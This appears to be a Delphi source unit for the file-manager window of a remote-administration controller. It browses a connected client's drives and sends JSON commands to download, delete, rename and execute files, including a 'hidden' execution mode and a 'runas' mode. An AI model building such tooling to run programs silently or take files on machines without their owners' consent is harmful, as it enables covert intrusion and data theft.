unit UnitFileManager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.Menus, System.JSON, ncLines, System.UITypes;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterFormProc = procedure(aLine: TncLine) of object;

  TForm9 = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    Edit1: TEdit;
    Geri: TButton;
    Yenile: TButton;
    PopupMenu1: TPopupMenu;
    Delete1: TMenuItem;
    Delete2: TMenuItem;
    Download1: TMenuItem;
    NewFolder1: TMenuItem;
    Rename1: TMenuItem;
    Upload1: TMenuItem;
    Copy1: TMenuItem;
    Paste1: TMenuItem;
    Normal1: TMenuItem;
    Normal2: TMenuItem;
    RunAs1: TMenuItem;
    procedure Delete1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Normal2Click(Sender: TObject);
    procedure RunAs1Click(Sender: TObject);
    procedure NewFolder1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure Paste1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure GeriClick(Sender: TObject);
    procedure YenileClick(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
  private
    FLine: TncLine;
    FClientID: string;
    FOnSendJSON: TSendJSONProc;
    FOnUnregister: TUnregisterFormProc;

    FCurrentPath: string;
  public
    procedure SetupForClient(aLine: TncLine; const aClientID: string;
      aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
    procedure HandleFileManagerJSON(JSONObj: TJSONObject);
    procedure DetachCallbacks;
    procedure RequestDrives;
    procedure RequestDirectory(const Path: string);
  end;

var
  Form9: TForm9;

implementation

{$R *.dfm}

procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
  aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
begin
  FLine := aLine;
  FClientID := aClientID;
  FOnSendJSON := aSendJSONProc;
  FOnUnregister := aUnregisterProc;

  Caption := 'File Manager - ' + FClientID;
  FCurrentPath := '';
  Edit1.Text := '';
  ListView1.Items.Clear;
  StatusBar1.SimpleText := 'Folders [0] Files [0]';

  OnClose := FormClose;
  Geri.OnClick := GeriClick;
  Yenile.OnClick := YenileClick;
  ListView1.OnDblClick := ListView1DblClick;
  Edit1.OnKeyDown := Edit1KeyDown;
end;

procedure TForm9.DetachCallbacks;
begin
  FLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm9.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) and Assigned(FLine) then
    FOnUnregister(FLine);
  Action := caFree;
end;

procedure TForm9.RequestDrives;
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getdrives');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RequestDirectory(const Path: string);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getfiles');
    JSONObj.AddPair('path', Path);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.HandleFileManagerJSON(JSONObj: TJSONObject);
var
  Action: string;
  Items: TJSONArray;
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
begin
  if not Assigned(JSONObj) then Exit;

  Action := '';
  if Assigned(JSONObj.Values['type']) then
    Action := JSONObj.Values['type'].Value;

  if SameText(Action, 'drives') then
  begin
    Items := JSONObj.Values['drives'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCurrentPath := '';
      Edit1.Text := '';
      for i := 0 to Items.Count - 1 do
      begin
        LItem := ListView1.Items.Add;
        LItem.Caption := Items.Items[i].Value;
        LItem.SubItems.Add(''); // Date
        LItem.SubItems.Add('Drive');
        LItem.SubItems.Add(''); // Size
        LItem.ImageIndex := -1;
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    StatusBar1.SimpleText := 'Drives listed';
  end
  else if SameText(Action, 'files') then
  begin
    FCurrentPath := JSONObj.Values['path'].Value;
    Edit1.Text := FCurrentPath;
    Items := JSONObj.Values['files'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCount := 0;
      DCount := 0;
      for i := 0 to Items.Count - 1 do
      begin
        ItemObj := Items.Items[i] as TJSONObject;
        LItem := ListView1.Items.Add;
        LItem.Caption := ItemObj.Values['name'].Value;
        LItem.SubItems.Add(ItemObj.Values['date'].Value);
        LItem.SubItems.Add(ItemObj.Values['type'].Value);
        LItem.SubItems.Add(ItemObj.Values['size'].Value);

        if SameText(ItemObj.Values['type'].Value, 'Folder') then
          Inc(DCount)
        else
          Inc(FCount);
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    StatusBar1.SimpleText := Format('Folders [%d] Files [%d]', [DCount, FCount]);
  end
  else if SameText(Action, 'log') then
  begin
    StatusBar1.SimpleText := JSONObj.Values['message'].Value;
  end;
end;

procedure TForm9.GeriClick(Sender: TObject);
var
  P: string;
begin
  if (FCurrentPath = '') then
  begin
    RequestDrives;
    Exit;
  end;

  P := ExcludeTrailingPathDelimiter(FCurrentPath);
  P := ExtractFilePath(P);

  if (P = '') then
    RequestDrives
  else
    RequestDirectory(P);
end;

procedure TForm9.YenileClick(Sender: TObject);
begin
  if FCurrentPath = '' then
    RequestDrives
  else
    RequestDirectory(FCurrentPath);
end;

procedure TForm9.ListView1DblClick(Sender: TObject);
var
  LItem: TListItem;
  Name, FType: string;
begin
  LItem := ListView1.Selected;
  if not Assigned(LItem) then Exit;

  Name := LItem.Caption;
  FType := LItem.SubItems[1];

  if SameText(FType, 'Drive') then
    RequestDirectory(Name)
  else if SameText(FType, 'Folder') then
    RequestDirectory(IncludeTrailingPathDelimiter(FCurrentPath) + Name)
  else
  begin
    // It's a file, default action: Normal Execute
    Normal1Click(nil);
  end;
end;

procedure TForm9.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if Trim(Edit1.Text) = '' then
      RequestDrives
    else
      RequestDirectory(Edit1.Text);
  end;
end;

procedure TForm9.Copy1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'copyfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Delete1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  if MessageDlg('Are you sure you want to delete this?', mtConfirmation, [mbYes, mbNo], 0) <> mrYes then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'deletefile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Download1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'downloadfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.NewFolder1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  FolderName: string;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  FolderName := InputBox('New Folder', 'Enter folder name:', 'New Folder');
  if FolderName = '' then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'createfolder');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + FolderName);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'normal');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'hidden');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Paste1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'pastefile');
    JSONObj.AddPair('path', FCurrentPath);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Rename1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  NewName: string;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  NewName := InputBox('Rename', 'Enter new name:', ListView1.Selected.Caption);
  if (NewName = '') or (NewName = ListView1.Selected.Caption) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'rename');
    JSONObj.AddPair('oldpath', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('newpath', IncludeTrailingPathDelimiter(FCurrentPath) + NewName);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RunAs1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'runas');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Upload1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  // Upload logic would typically involve a FileOpenDialog and Base64 encoding
  // For now, we'll just log that the user clicked it, as requested
  StatusBar1.SimpleText := 'Upload initiated... (Feature to be completed with client-side)';
end;

end.
